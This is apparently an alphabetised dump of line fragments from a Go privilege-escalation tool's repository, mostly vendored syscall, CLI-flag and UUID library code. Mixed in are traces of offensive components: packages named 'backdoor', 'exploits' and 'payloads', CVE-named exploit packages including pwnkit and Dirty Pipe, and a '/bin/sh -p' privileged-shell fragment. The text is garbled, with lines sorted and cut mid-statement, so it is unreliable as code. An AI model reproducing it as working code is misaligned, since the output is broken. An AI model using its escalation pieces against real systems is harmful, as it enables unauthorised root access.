iov.Base = 
iov.Base = (
iov.Len = uint32(length)
iov.Len = uint64(length)
iov.SetLen(1)
iov.SetLen(len(p))
iovec := Iovec{(
iovec)))
iovecs := bytes2iovec(iovs)
iovecs[i].Base = 
iovecs[i].Base = (
iovecs[i].SetLen(len(b))
iovs[0]
iovs[0])
ip := ParseIPv4Mask(s)
ip := net.ParseIP(strings.TrimSpace(ipStr))
ip := net.ParseIP(strings.TrimSpace(s))
ip := net.ParseIP(strings.TrimSpace(sval))
ip := net.ParseIP(sval)
ipMaskValue {
ipMaskValue) Set(s string) error {
ipMaskValue) String() string { return net.IPMask(
ipMaskValue) Type() string {
ipMaskValue)(p)
ipNetValue {
ipNetValue) Set(value string) error {
ipNetValue) Type() string {
ipNetValue)(p)
ipNetValue:
ipSliceValue {
ipSliceValue) Append(val string) error {
ipSliceValue) GetSlice() []string {
ipSliceValue) Replace(val []string) error {
ipSliceValue) Set(val string) error {
ipSliceValue) String() string {
ipSliceValue) Type() string {
ipSliceValue) toString(val net.IP) string {
ipStrSlice[i] = ip.String()
ipValue {
ipValue) Set(s string) error {
ipValue) String() string { return net.IP(
ipValue) Type() string {
ipValue)(p)
ipc_64 = 0x100
ipnet = ipNetValue(
ipsv := new(ipSliceValue)
ipsv.value = p
ipsv.value = val
is fed though mkpost.go to format the code correctly and remove any hidden or
isEqual = r0 != 0
isInSurrogateArea := key >= 0xd800 
isValid = r0 != 0
isValidSecurityDescriptor(sd 
isValidSid(sid 
isWellKnown = r0 != 0
isWellKnownSid(sid 
isWow64 = _p0 != 0
isWow64 {
issetugid(void)
issuecomment-282741924.
issuecomment-760715755.
issuerepo: golang/go
istr := strioctl{
istr)))
isv := new(float32SliceValue)
isv := new(float64SliceValue)
isv := new(int32SliceValue)
isv := new(int64SliceValue)
isv := new(intSliceValue)
isv.value = p
isv.value = val
it difficult to keep up with all of the pointers in your code.
italic
itv)
j := 0
j := i 
jTBEBqF0bHN
jail)
jboverfelt
jobname[0])
json
json table yaml
k.Filter = int16(mode)
k.Filter = uint32(mode)
k.Flags = uint16(flags)
k.Flags = uint32(flags)
k.Ident = uint32(fd)
k.Ident = uint64(fd)
keep track of which version of the OS the files were generated from (ex.
keepAliveDrops    uint32
keepAliveProbes   uint32
key = Handle(r0)
keyAltLeft
keyAltRight
keyBackspace = 127
keyClearScreen
keyCtrlC     = 3
keyCtrlD     = 4
keyCtrlU     = 21
keyDeleteLine
keyDeleteWord
keyDown
keyEnd
keyEnter     = '
keyEscape    = 27
keyHome
keyLeft
keyPasteEnd
keyPasteStart
keyRight
keyUnknown   = 0xd800 /
keyUp
keys := sortedKeys(data)
keys[i] = k
killed  = 9
kqueue(void)
kqueue1(int flags)
ktrace(const char 
kubectl
kubectl controls the Kubernetes cluster manager.
kubectl get
kubectl get [tab][tab]
kubectl get pod [mypod]
kubectl get pod [tab][tab]
l    
l := int32(unsafe.Sizeof(rsa))
l := int32(unsafe.Sizeof(v))
l.Lifru[0]))
l.Lifru[0])) = d
l.Name[i] = int8(name[i])
l.mu.Lock()
l.received = l.received[n:]
l.received = nil
label=Test
language: go
last := 0
last := bits[len(bits)-1]
last = i 
lastActivity      [8]byte  // uint64
lastArg = lastArg[index
lastLine}
lastParam}-1)):1}
lasterr = syscall.Errno(r0)
lastsys = int(r0)
lasttime = 0
lasttime = now
lasttime uint64 // last time we returned
lchflags(const char 
lchmod(const char 
lchown(const char 
lcl0WindowCount   uint32
lclSMCBufSz       uint32
lclSMCLinkId      uint32
left := 0
left = av.Int()
left = int64(av.Len())
left = t.cursorX - x
len  int
len := (data.size - uint32(unsafe.Offsetof(data.hardwareID))) / 2
len = uint32(r0)
len(o)))
len(t.line)))
len(t.remainder)]
len(value.Info)
len)
lenOther := len(segmentsOther)
lenSelf := len(segmentsSelf)
length
length      uint32
length := 0
length uint32
lessThan         operator = '<'
lessThanEqual    operator = '
let it know that a system call is running.
letters for flags. All but the last shorthand letter must be boolean flags
letters for flags. All but the last shorthand letter must be boolean flags.
lflags 
lgetxattr(const char 
lhs := segmentsSelf[i]
libc_accept(SB)
libc_access(SB)
libc_adjtime(SB)
libc_bind(SB)
libc_chdir(SB)
libc_chflags(SB)
libc_chmod(SB)
libc_chown(SB)
libc_chroot(SB)
libc_clock_gettime(SB)
libc_clonefile(SB)
libc_clonefileat(SB)
libc_close(SB)
libc_closedir(SB)
libc_connect(SB)
libc_dup(SB)
libc_dup2(SB)
libc_exchangedata(SB)
libc_exit(SB)
libc_faccessat(SB)
libc_fchdir(SB)
libc_fchflags(SB)
libc_fchmod(SB)
libc_fchmodat(SB)
libc_fchown(SB)
libc_fchownat(SB)
libc_fclonefileat(SB)
libc_fcntl(SB)
libc_fdopendir(SB)
libc_fgetxattr(SB)
libc_flistxattr(SB)
libc_flock(SB)
libc_fpathconf(SB)
libc_fremovexattr(SB)
libc_fsetxattr(SB)
libc_fstat(SB)
libc_fstat64(SB)
libc_fstatat(SB)
libc_fstatat64(SB)
libc_fstatfs(SB)
libc_fstatfs64(SB)
libc_fsync(SB)
libc_ftruncate(SB)
libc_futimes(SB)
libc_getcwd(SB)
libc_getdtablesize(SB)
libc_getegid(SB)
libc_geteuid(SB)
libc_getfsstat(SB)
libc_getfsstat64(SB)
libc_getgid(SB)
libc_getgroups(SB)
libc_getpeername(SB)
libc_getpgid(SB)
libc_getpgrp(SB)
libc_getpid(SB)
libc_getppid(SB)
libc_getpriority(SB)
libc_getrlimit(SB)
libc_getrusage(SB)
libc_getsid(SB)
libc_getsockname(SB)
libc_getsockopt(SB)
libc_gettimeofday(SB)
libc_getuid(SB)
libc_getxattr(SB)
libc_ioctl(SB)
libc_issetugid(SB)
libc_kevent(SB)
libc_kill(SB)
libc_kqueue(SB)
libc_lchown(SB)
libc_link(SB)
libc_linkat(SB)
libc_listen(SB)
libc_listxattr(SB)
libc_lseek(SB)
libc_lstat(SB)
libc_lstat64(SB)
libc_madvise(SB)
libc_mkdir(SB)
libc_mkdirat(SB)
libc_mkfifo(SB)
libc_mknod(SB)
libc_mlock(SB)
libc_mlockall(SB)
libc_mmap(SB)
libc_mmap64 syscallFunc
libc_mount(SB)
libc_mprotect(SB)
libc_msync(SB)
libc_munlock(SB)
libc_munlockall(SB)
libc_munmap(SB)
libc_open(SB)
libc_openat(SB)
libc_pathconf(SB)
libc_pipe(SB)
libc_poll(SB)
libc_pread(SB)
libc_ptrace(SB)
libc_pwrite(SB)
libc_read(SB)
libc_readdir_r(SB)
libc_readlink(SB)
libc_readlinkat(SB)
libc_recvfrom(SB)
libc_recvmsg(SB)
libc_removexattr(SB)
libc_rename(SB)
libc_renameat(SB)
libc_revoke(SB)
libc_rmdir(SB)
libc_select(SB)
libc_sendfile(SB)
libc_sendmsg(SB)
libc_sendto(SB)
libc_setegid(SB)
libc_seteuid(SB)
libc_setgid(SB)
libc_setgroups(SB)
libc_setlogin(SB)
libc_setpgid(SB)
libc_setpriority(SB)
libc_setprivexec(SB)
libc_setregid(SB)
libc_setreuid(SB)
libc_setrlimit(SB)
libc_setsid(SB)
libc_setsockopt(SB)
libc_settimeofday(SB)
libc_setuid(SB)
libc_setxattr(SB)
libc_shmat(SB)
libc_shmctl(SB)
libc_shmdt(SB)
libc_shmget(SB)
libc_shutdown(SB)
libc_socket(SB)
libc_socketpair(SB)
libc_stat(SB)
libc_stat64(SB)
libc_statfs(SB)
libc_statfs64(SB)
libc_symlink(SB)
libc_symlinkat(SB)
libc_sync(SB)
libc_sysctl(SB)
libc_truncate(SB)
libc_umask(SB)
libc_undelete(SB)
libc_unlink(SB)
libc_unlinkat(SB)
libc_unmount(SB)
libc_utimensat(SB)
libc_utimes(SB)
libc_wait4(SB)
libc_write(SB)
lillian    = 2299160          // Julian day of 15 Oct 1582
limitations under the License.
line
line 
line = line[1:]
line = line[todo:]
line = string(t.line)
line = strings.TrimSpace(line)
line []rune
lineIsPasted := t.pasteActive
lineIsPasted = false
lineIsPasted = true
lineOk := false
link(const char 
link)
lint:
linters:
linux/types.go
list.Sort()
list[i] = string(k)
listenerId    uint32
listxattr(const char 
lk.Len = 
lk.Pid = 
lk.Start = 
lk.Type = 
lk.Whence = 
llistxattr(const char 
lo := int32(offset)
lo := uint32(b[0]) 
loadDLL := name
loadDLL = systemdir 
load_g(SB)   // Restore g and stack pointer
local
local             [28]byte // union of sockaddr4 and sockaddr6
local         [28]byte // union of sockaddr4 and sockaddr6
local := c.LocalFlags()
localCmd.Flags().StringVarP(
localIov[0])
localNonPersistentFlags := cmd.LocalNonPersistentFlags()
localNonPersistentFlags := finalCmd.LocalNonPersistentFlags()
localSockFilter := (
localSockFilter.Addr[i] = localSockaddr.Addr[i]
localSockFilter.Family = AF_INET
localSockFilter.Family = AF_INET6
localSockFilter.Port = localSockaddr.Port
localSockaddr := (
localSockaddr.Addr))
localState := state.New()
localState.Assess()
localState.HasPassword = promptForPassword
lock sync.Mutex
lockable := pipe.NewLockable(ptmx)
log      logger.Logger
logMode           [8]byte
logger.silenced = true
logger.title = title
logo=github%20actions
logoColor=fff)](https://github.com/spf13/cobra/actions
longCache=tru
lremovexattr(const char 
lsetxattr(const char 
lstat(const char 
luName            [8]byte
lutimes(const char 
m := 0
m := SocketControlMessage{Header: 
m := []int{}
m := []rune{}
m := int(iovecs[i].Len)
m = n
m.Data[0]))
m.Data[i])))
m.Lock()
m.active[p] = b
mAzfO9JrbApNNgaTdGDITg=
mac_p)
madvise(void 
main(void)
main:
maintainers:
major 
major := uint32((dev 
major = segments[0]
make all
make test
makeAbsoluteSD(selfRelativeSD 
makeSelfRelativeSD(absoluteSD 
map[string]int
map[string]int {
map[string]int) 
map[string]int64
map[string]int64 {
map[string]int64) 
map[string]string
map[string]string {
map[string]string) 
marker)
mask    = 0x7F
mask  = 0x7F
mask != 0 }
mask != exited {
mask != exited }
mask != stopped 
mask := ParseIPv4Mask(sval)
mask := net.ParseIP(s)
mask = net.ParseIP(s)
mask == exited }
mask == killed 
mask == stopped 
mask)
match  uint32
match a syscall number in the 
matches := constraintRegexp.FindStringSubmatch(v)
matches := make([]
matches := pattern.FindStringSubmatch(v)
matrix:
max     int
max := uint32(len(s))
max--
maxLine int
maxSndWnd         uint32
maxlen := 0
maxlen = len(line)
means.
met:
metadata string
mfgName       [LINE_LEN]uint16
mib[0])
migrating the build system to use containers so the builds are reproducible.
min := d[i-1][j]
min = d[i-1][j-1]
min = d[i][j-1]
mincore(void 
minherit(void 
minor 
minor := uint32((dev 
minor = segments[1]
missingFlagNames := []string{}
mkall.sh
mkall.sh -n
mkasm=
mkdir -p bin
mkdir -p bin/darwin-amd64/tml
mkdir -p bin/linux-amd64/tml
mkdir(const char 
mkerrors.sh
mkerrors=
mkfifo(const char 
mknod(const char 
mksyscall.go
mksysnum=
mksysnum_${GOOS}.go
mktypes=
mlock(const void 
mlockall(int flags)
mmap(void 
mmapper) Munmap(data []byte) (err error) {
mmapper{
mode 
mode == mode {
mode uint32
mode)
modep)
module github.com/liamg/traitor
moduleImage[0])
more helpful behavior and instructions on how to run the CLI tool. To see what
mount(const char 
mountPointReparseBuffer)(unsafe.Pointer(
mousetrap is a tiny library that answers a single question.
mousetrap provides a way to detect these invocations so that you can provide
mprotect(void 
mqstat)
mremap(void 
mreq))
mreq)))
ms = uint64(r0)
msg = uint(data)
msg.Accrightslen = int32(len(oob))
msg.Control = 
msg.Control = (
msg.Iov = 
msg.Iovlen = 1
msg.Name = (
msg.Namelen = SizeofSockaddrAny
msg.Namelen = int32(salen)
msg.Namelen = uint32(SizeofSockaddrAny)
msg.Namelen = uint32(salen)
msg.SetControllen(len(oob))
msg_flags)
msg_prio)
msghdr.Controllen = int32(length)
msghdr.Controllen = uint32(length)
msghdr.Controllen = uint64(length)
msghdr.Iovlen = int32(length)
msghdr.Iovlen = uint32(length)
msghdr.Iovlen = uint64(length)
msync(void 
mu       sync.Mutex
mu    sync.Mutex
mu   sync.Mutex
mu  sync.Mutex
munlock(const void 
munlockall(void)
munmap(void 
must_have_one_flag[@]} -ne 0 ]
must_have_one_flag[@]} -ne 0 ]]
must_have_one_noun[@]} -ne 0 ]]
mutuallyExclusiveGroupStatus := map[string]map[string]bool{}
myFlagSet.SetNormalizeFunc(aliasNormalizeFunc)
myFlagSet.SetNormalizeFunc(wordSepNormalizeFunc)
n -= m
n := (
n := 0
n := caparsize(rights)
n := clen(
n := clen(buf[:])
n := f.GetNormalizeFunc()
n := fh.Size()
n := len(buf)
n := len(name)
n := len(s)
n := net.IPNet(ipnet)
n := uint32(100)
n := uint32(50)
n := uint32(MAX_PATH)
n := uint32(initSize)
n := uintptr(0)
n := uintptr(4)
n := uintptr(8)
n := uintptr(CTL_MAXNAME) 
n := uintptr(SizeofClockinfo)
n := uintptr(SizeofKinfoProc)
n := uintptr(SizeofUvmexp)
n := uintptr(unsafe.Sizeof(tv))
n := unsafe.Sizeof(uname.Sysname)
n = 0
n = STATFIXLEN 
n = clen(
n = clen(buf) 
n = clen(buf[:])
n = i
n = i 
n = int(n32)
n = int(r0)
n = int32(r0)
n = int64(int64(r0)<<32 
n = int64(int64(r1)<<32 
n = int64(r0)
n = l
n = n
n = t.pos
n = uint32(r0)
n = uint64(r0)
n = unsafe.Sizeof(uname.Machine)
n = unsafe.Sizeof(uname.Nodename)
n = unsafe.Sizeof(uname.Release)
n = unsafe.Sizeof(uname.Version)
n it finds during processing.
n itself.
n or io.EOF.
n with 
n' read -r comp
n' read -r line
n))) //nolint:gosec // Expected unsafe pointer for Syscall call.
n// Error table
n// Signal table
nDid you mean this
nInterface    [16]byte
n[0])))
name
name              string
name   string
name := (
name := c.Use
name := flag.Name
name := flag.Shorthand
name := rec[namoff : namoff
name := s[2:]
name := sa.Name
name := syscall.UTF16ToString(pe.szExeFile[:])
name = flag.Value.Type()
name = name[1:]
name = name[:i]
name = short.Name
name = split[0]
name = u2s(unsafe.Pointer(r0))
name = usage[i
name [IFNAMSIZ]byte
name a few. [This list](./projects_using_cobra.md) contains a more extensive list of projects using Cobra.
name string
name)
name16)
nameForVar := name
nameLen := len(command.Name())
nameLen := len(x.Name())
name[i] = byte(c)
name[i] = byte(pp.Name[i])
name[i] = pp.Addr[i]
namebuf)
nameptr 
nameptr := (
nameptr = (
nameptr))
namespace := fullattr[0:s]
namlen > uint64(len(rec)) {
namlen]
nanosleep(const struct timespec 
needsConvert = true
needsConvert bool
net.IP {
net.IP) 
net.IPMask {
net.IPMask) 
net.IPNet {
net.IPNet) 
netAccept      = 5
netAccept4     = 18
netBind        = 2
netConnect     = 3
netGetPeerName = 7
netGetSockName = 6
netGetSockOpt  = 15
netListen      = 4
netRecv        = 10
netRecvFrom    = 12
netRecvMMsg    = 19
netRecvMsg     = 17
netSend        = 9
netSendMMsg    = 20
netSendMsg     = 16
netSendTo      = 11
netSetSockOpt  = 14
netShutdown    = 13
netSocket      = 1
netSocketPair  = 8
netbsd
netbsd_386)
netbsd_amd64)
netbsd_arm)
netbsd_arm64)
neterr = syscall.Errno(r0)
new installation of the target OS (or updating the source checkouts for the
new)
newArgCount := finalCmd.Flags().NArg()
newSet.VisitAll(func(flag 
newSet.VisitAll(func(goflag 
newState := 
newState)
newState.Iflag 
newState.Lflag 
new_lwp)
newfd = int(r0)
newflag := PFlagFromGoFlag(goflag)
newlowoffset = uint32(r0)
newoffset = int64(int64(r1)<<32 
newoffset = int64(r0)
nexec /bin/sh -p 0<
nextEpfd int
nextSubCmd := argsWOflags[0]
nf := 0
nfd = 0
nfd = int(r0)
nhxU
nid := nodeID
nn = int(r0)
nname := f.normalizeFlagName(flag.Name)
noDesc := c.CompletionOptions.DisableDescriptions
noDescriptions := (cmd.CalledAs() == ShellCompNoDescRequestCmd)
node   pod   replicationcontroller   service
nodeID [6]byte // hardware for version 1 UUIDs
nodeMu sync.Mutex
nodeMu.Lock()
nodeMu.Unlock()
nodes[0]))
normalName := f.normalizeFlagName(name)
normalizeNameFunc func(f 
normalizedFlagName := f.normalizeFlagName(flag.Name)
notEqual         operator = '
notary
notdead)
notification)
noun_aliases[@]} -gt 0 
nouns[@]} -1]}
nouns[@]} -eq 0 ]]
now := uint64(t.UnixNano()/100) 
np := (
npackage cve20214034
nsec 
nsec -= 116444736000000000
nsec /= 100
nsec := int64(ft.HighDateTime)<<32 
nsec := int64(t.Nanosecond())
nsec := nsec()
nsec = (sec % 10000000) 
nsec = nsec % 1e9
nsize)
ntp_adjtime(struct timex 
ntp_gettime(struct ntptimeval 
ntstatus = NTStatus(r0)
ntvp)
nu = NullUUID{}
nu.UUID = id
nu.UUID)
nu.Valid = err == nil
nu.Valid = false
nu.Valid = true
num  Errno
num  Signal
num  syscall.Errno
num  syscall.Signal
number byte
number uint32
nwmConnEntry)(unsafe.Pointer(
nwmCurrentVer = 2
nwmFilterIdentifier    = 0xd5e6d4c6
nwmFilterLclAddrMask = 0x20000000 // Local address
nwmFilterLclPortMask = 0x10000000 // Local port
nwmFilterSrcAddrMask = 0x20000000 // Source address
nwmFilterSrcPortMask = 0x10000000 // Source port
nwmGlobalStatsType = 14
nwmHeaderIdentifier    = 0xd5e6d4c8
nwmICMPGStatsEntry     = 0xd5e6d4c9c3d4d7c7
nwmICMPTStatsEntry     = 0xd5e6d4c9c3d4d7e3
nwmIPGStatsIdentifier  = 0xd5e6d4c9d7c7e2e3
nwmIPStatsIdentifier   = 0xd5e6d4c9d7e2e340
nwmRecHeader)(unsafe.Pointer(
nwmRecHeaderIdentifier = 0xd5e6d4d9
nwmTCPConnIdentifier   = 0xd5e6d4c3
nwmTCPConnType     = 1
nwmTCPStateClosWait = 8
nwmTCPStateClosed   = 1
nwmTCPStateClosing  = 10
nwmTCPStateDeletTCB = 12
nwmTCPStateEstab    = 5
nwmTCPStateFinWait1 = 6
nwmTCPStateFinWait2 = 7
nwmTCPStateLastAck  = 9
nwmTCPStateListen   = 2
nwmTCPStateSynRcvd  = 4
nwmTCPStateSynSent  = 3
nwmTCPStateTimeWait = 11
nwmTCPStatsEntry = nil
nwmTCPStatsEntry)(unsafe.Pointer(ptr))
nwmTCPStatsIdentifier  = 0xd5e6d4e3c3d7e2e3
nwmTriplet = (
nwmTriplet)(unsafe.Pointer(
nwmType     uint16
nwmUDPStatsIdentifier  = 0xd5e6d4e4c4d7e2e3
nwmVersion1   = 1
nwmVersion2   = 2
nwrite = int32(r0)
o default
o nospace
oact)
oattr)
obreak(char 
obtaining a copy of this software and associated
of include files in the 
of the library.     
of the public at large and to the detriment of our heirs and
of this software dedicate any and all copyright interest in the
off = int64(r0)
offset := request.header.outputDesc.offset 
offset = request.header.outputDesc.offset 
offset uint32
offset--
offsetHigh := uint32((offset >> 32) 
offsetLow := uint32(offset 
oitv)
ok = true
old := st
oldBuf       []statfs_freebsd11_t
oldBuf[0])
oldBuf[i])
oldDev = int(dev)
oldFixedSize < len(old) {
oldFixedSize = int(unsafe.Offsetof(dirent_freebsd11{}.Name))
oldPrompt := t.prompt
oldSeq := clockSeq
oldStat)
oldState := State{state{termios: 
oldStatfs)
oldWidth := t.termWidth
olddelta)
oldfreq)
oldmask = int(r0)
oldptr := uintptr(unsafe.Pointer(oldp))
omqstat)
once     sync.Once
once sync.Once
oob[0]
oob[0]))
oobn = int(msg.Accrightslen)
oobn = int(msg.Controllen)
op       operator
op operator
open(const char 
openbsd)
openbsd_386)
openbsd_amd64)
openbsd_arm)
openbsd_arm64)
openbsd_mips64)
opsid)
options     uint32
options)
or a flag with a default value
or the specific OS/Architecture pair respectively) that need special handling
order or agree to the institution of patent litigation against any
orderedActual     []
orderedFormal     []
orgLastArg := lastArg
origcommand
original string
origlen := len(buf)
os.Exit(1)
os.Exit(2)
os.File) (
os.File) (size 
os.File) error {
os.File{
os.ModeSetgid)
os.ModeSetuid
os.ModeSetuid == 0 {
os.O_APPEND
os.O_CREATE
os.ProcAttr{
osU4=
osVersionInfoSize uint32
osZ0dIEHVCNaF6hmiTsv7Wv
osa)
oset)
osreldate     uint32
osreldateOnce sync.Once
oss)
otherNumeric := true
otherNumeric = false
otherPreReleaseLen := len(otherPreReleaseMeta)
others who are seeking help. Harassment of any kind will not be tolerated.
out := c.OutOrStdout()
out = out[copied:]
out = out[n:]
out.AddFlag(f)
outArgs = args
outArgs = args[1:]
outArgs = stripUnknownFlagValue(outArgs)
outBuf []byte
outBuffered       uint32
outDelayAcks      uint32
outLen)
outOfOrderCount   uint32
outOldestTime     [8]byte // uint64
outRsts           uint32
outSegs           [8]byte  // uint64
outSegs           uint64
outShorts = shorthands[1:]
outWinProbes      uint32
outWinUpdates     uint32
outWriter io.Writer
out[i] = d
out[i] = float32(temp64)
out[i] = int32(temp64)
out[i] = ip
out[i] = s.toString(d)
out[i] = strconv.Itoa(d)
out[i] = uint(u)
out[kv[0]] = kv[1]
output 
output            io.Writer // nil means stderr
output := bytes.NewBufferString(
output := l.received[:]
output = resetAll 
outputDesc  nwmQuadruplet
ovadvise(int anom)
ovalue)
owner 
owner    
owner = (
ownerDefaulted = _p0 != 0
ownerDefaulted {
p := 
p := (
p := 0
p := []bool{}
p := []float32{}
p := []float64{}
p := []int32{}
p := []int64{}
p := []int{}
p := []net.IP{}
p := []string{}
p := []time.Duration{}
p := []uint{}
p := map[string]int64{}
p := map[string]int{}
p := map[string]string{}
p := new(PortEvent)
p := new([]byte)
p := new(bool)
p := new(float32)
p := new(float64)
p := new(int)
p := new(int16)
p := new(int32)
p := new(int64)
p := new(int8)
p := new(net.IP)
p := new(net.IPMask)
p := new(net.IPNet)
p := new(string)
p := new(time.Duration)
p := new(uint)
p := new(uint16)
p := new(uint32)
p := new(uint64)
p := new(uint8)
p = '
p = (
p = i 
p = unsafe.Pointer(
p = val
p == 0 {
p.Privileges[0]))[:p.PrivilegeCount:p.PrivilegeCount]
p.mu.Lock()
p.mustFind()
p.proc))) == nil {
p.writer.Write([]byte(p.state.setAttr(-int8(attr))))
p.writer.Write([]byte(p.state.setAttr(int8(attr))))
p.writer.Write([]byte(p.state.setBg(esc)))
p.writer.Write([]byte(p.state.setBg(resetBg)))
p.writer.Write([]byte(p.state.setFg(esc)))
p.writer.Write([]byte(p.state.setFg(resetFg)))
p.writer.Write([]byte(resetAll))
p.writer.Write([]byte(string([]rune{r})))
p=glibc.git
p[0]
p[0] = byte(sa.Port >> 8)
p[0] = int(pp[0])
p[0] = int(x[0])
p[0] = r
p[0])
p[0]))
p[1] = byte(sa.Port)
p[1] = int(pp[1])
p[1] = int(x[1])
p[1] = w
pack:
package backdoor
package cmd
package cobra
package cve20213560
package cve20214034
package cve20220847
package dockersock
package exploits
package logger
package main
package mousetrap
package payloads
package pflag
package pipe
package plan9
package pty
package random
package shell
package state
package term
package terminal
package tml
package unix
package unsafeheader
package uuid
package version
package windows
padding := buf[dstPos
padding[i] = 0
page := uintptr(offset / 4096)
pageSize int64
panic(
panic(e)
panic(err)
panic(err.Error()) // rand should never fail
panic(msg)
panic(msg) // Happens only if flags are declared with identical names
param)
params := 
params)
params))
params.size = uint32(unsafe.Sizeof(
parent 
parent commands are ignored. By enabling 
parentsPflags 
parms)
parse local flags on each command before executing the target command.
parsed            bool
parserState) setAttr(attr int8) string {
parserState) setBg(esc string) string {
parserState) setFg(esc string) string {
parsing in mksysnum.
partOtherPre = otherPreReleaseMeta[i]
partSelfPre = selfPreReleaseMeta[i]
passiveDrops      uint32
passiveOpened     uint32
pasteActive bool
patch = segments[2]
path = args[1]
path = testPath
path)
path2)
pathconf(const char 
paths map[string]
paths:   make(map[string]
payload[0])
pcPriClassBase      int32
pe := new(portEvent)
pe = 
peExt.Cookie = 
peExt.Events = peInt.Events
peExt.Fd = uintptr(peInt.Object)
peExt.Path = BytePtrToString((
peExt.Source = peInt.Source
peExt.fobj = fCookie.fobj
peb = (
permissions)
persistentFlags := c.PersistentFlags()
pessimistic      operator = '
pflag
pflag is a drop-in replacement of Go's native flag package. If you import
pflag is available using the standard 
pflag is compatible with the GNU extensions to the POSIX recommendations
pflag is compatible with the [GNU extensions to the POSIX recommendations
pflag.Flag given a 
pflag.Flag {
pflag.Flag) bool {
pflag.Flag) {
pflag.Flag]func(cmd 
pflag.Flag{
pflags 
pgid = int(r0)
pgn := (
pgn[i] = pp.Addr[i
pgrp = int(r0)
pgsize = int(r0)
phxUg3i/EOWeeiiYUv3LS1hX5ZEZ
pid = int(pe.th32ParentProcessID)
pid = int(r0)
pid = uint32(r0)
pidp)
pipe(p 
pipe(void)
pipe2(int 
pipe2(p 
plan9)
plan9_386)
plan9_amd64)
plan9_arm)
pm) == -1 
pmtuErrors        uint32
pmtuRetrans       uint32
pointer receivers) and couple them to flag parsing by
pointers []unsafe.Pointer
policy)
poll(fds 
poll(struct pollfd 
pollEvts 
pollts(struct pollfd 
pool        [randPoolSize]byte // protected with poolMu
poolEnabled = false
poolEnabled = true
poolMu      sync.Mutex
poolMu.Lock()
poolMu.Unlock()
poolPos 
poolPos     = randPoolSize     // protected with poolMu
poolPos = 0
poolPos = randPoolSize
populate it with the following:
port  int
pos := int(p)
pos := t.pos
pos := t.pos - 1
pos int
pos--
position))))
posix_spawn(pid_t 
powershell
powershell := 
powershell-completions) for details.
powershell.Flags().BoolVar(
pp := (
pp.Addr))
pp.Path[0] = '@'
pp.Path[0]))[0:n]
pp.Port))
ppid = int(r0)
ppoll(fds 
pre      string
pre := matches[7]
pre = matches[4]
preExecHookFn(c)
preOther := other.Prerelease()
preSelf := v.Prerelease()
predictAck        uint32
predictData       uint32
pref)
prefix := string(t.line[:t.pos])
prepareCustomAnnotationsForFlags(cmd)
present on your system. This means that files
preset alternate versions for binary compatibility and translate them on the
prev = int(r0)
prev)
prevArg := args[len(args)-1]
print is for printing anything back to the screen.
prio = int(r0)
private identifiers. This cleaned-up code is written to
probeDrops        uint32
proc 
proc = uintptr(r0)
procAttr := 
procEntry)
procEntry.Size = uint32(unsafe.Sizeof(procEntry))
processEntry
processEntry)))
processEntry.dwSize = uint32(unsafe.Sizeof(processEntry))
processIds[0]
procgetmsg syscallFunc
procport_getn syscallFunc
profil(char 
program in uppercase with any 
prompt []rune
proto             byte
prototype can be exported (capitalized) or not.
providerName  [LINE_LEN]uint16
pset_create(psetid_t 
pset_destroy(psetid_t psid)
psid)
psize-1)/psize)
psm := (
psm[0] = byte(sa.PSM)
psm[1] = byte(sa.PSM >> 8)
ptm)))
pto := ptOwn{
ptr = uintptr(r0)
ptr = unsafe.Pointer(uintptr(ptr) 
ptr {
ptr)
pv := 
pwnkitSrc := fmt.Sprintf(
qf9qvLI
qnode := Sysctlnode{Flags: SYSCTL_VERS_1}
qnode))
qp := (
qs[j] = '
qs[j] = s[i]
query=workflow%3ATest)
quit = true
r := csv.NewReader(strings.NewReader(val))
r := regexp.MustCompile(
r = int(r0)
r = r 
r and 
r and ignores any 
r it finds.
r.Rights[0] = (capRightsGoVersion << 62) 
r.err = errno
r1 = uintptr(C.acct(C.uintptr_t(_p0)))
r1 = uintptr(C.chdir(C.uintptr_t(_p0)))
r1 = uintptr(C.chroot(C.uintptr_t(_p0)))
r1 = uintptr(C.close(C.int(fd)))
r1 = uintptr(C.dup(C.int(oldfd)))
r1 = uintptr(C.exit(C.int(code)))
r1 = uintptr(C.fchdir(C.int(fd)))
r1 = uintptr(C.fdatasync(C.int(fd)))
r1 = uintptr(C.getegid())
r1 = uintptr(C.geteuid())
r1 = uintptr(C.getgid())
r1 = uintptr(C.getpgid(C.int(pid)))
r1 = uintptr(C.getpgrp())
r1 = uintptr(C.getpid())
r1 = uintptr(C.getppid())
r1 = uintptr(C.getsid(C.int(pid)))
r1 = uintptr(C.getsystemcfg(C.int(label)))
r1 = uintptr(C.getuid())
r1 = uintptr(C.mlockall(C.int(flags)))
r1 = uintptr(C.munlockall())
r1 = uintptr(C.pause())
r1 = uintptr(C.pipe(C.uintptr_t(p)))
r1 = uintptr(C.setgid(C.int(uid)))
r1 = uintptr(C.setsid())
r1 = uintptr(C.settimeofday(C.uintptr_t(tv)))
r1 = uintptr(C.setuid(C.int(uid)))
r1 = uintptr(C.sync())
r1 = uintptr(C.time(C.uintptr_t(t)))
r1 = uintptr(C.times(C.uintptr_t(tms)))
r1 = uintptr(C.umask(C.int(mask)))
r1 = uintptr(C.umount(C.uintptr_t(_p0)))
r1 = uintptr(C.uname(C.uintptr_t(buf)))
r1 = uintptr(C.unlink(C.uintptr_t(_p0)))
r<blue>[</blue><yellow>
rGID int32
rUID int32
raceAcquire(unsafe.Pointer(
raceReadRange(unsafe.Pointer(
raceReleaseMerge(unsafe.Pointer(
raceWriteRange(unsafe.Pointer(
rand.Intn(8))
rand.Seed(time.Now().UnixNano())
rander      = rand.Reader // random function
rander = r
rander = rand.Reader
randomBits(b[:]) // clock sequence
randomBits(nodeID[:])
rasctl(void 
raw            RawSockaddrNFCLLCP
raw          RawSockaddrXDP
raw         RawSockaddrNFC
raw      RawSockaddrL2
raw      RawSockaddrLinklayer
raw     RawSockaddrALG
raw     RawSockaddrCAN
raw     RawSockaddrHCI
raw    RawSockaddrDatalink
raw    RawSockaddrIUCV
raw    RawSockaddrInet6
raw    RawSockaddrL2TPIP
raw    RawSockaddrL2TPIP6
raw    RawSockaddrNetlink
raw    RawSockaddrPPPoX
raw   RawSockaddrVM
raw  RawSockaddrCtl
raw  RawSockaddrInet4
raw  RawSockaddrUnix
raw  RawSockaddrVM
raw := 
raw := st 
raw RawSockaddrRFCOMM
raw RawSockaddrTIPC
rawSyscall6(SB)
rawSysvicall6(SB)
rawinfo := (
rawinfo.Bytes_deduped = value.Info[i].Bytes_deduped
rawinfo.Dest_fd = value.Info[i].Dest_fd
rawinfo.Dest_offset = value.Info[i].Dest_offset
rawinfo.Reserved = value.Info[i].Reserved
rawinfo.Status = value.Info[i].Status
rawrange := (
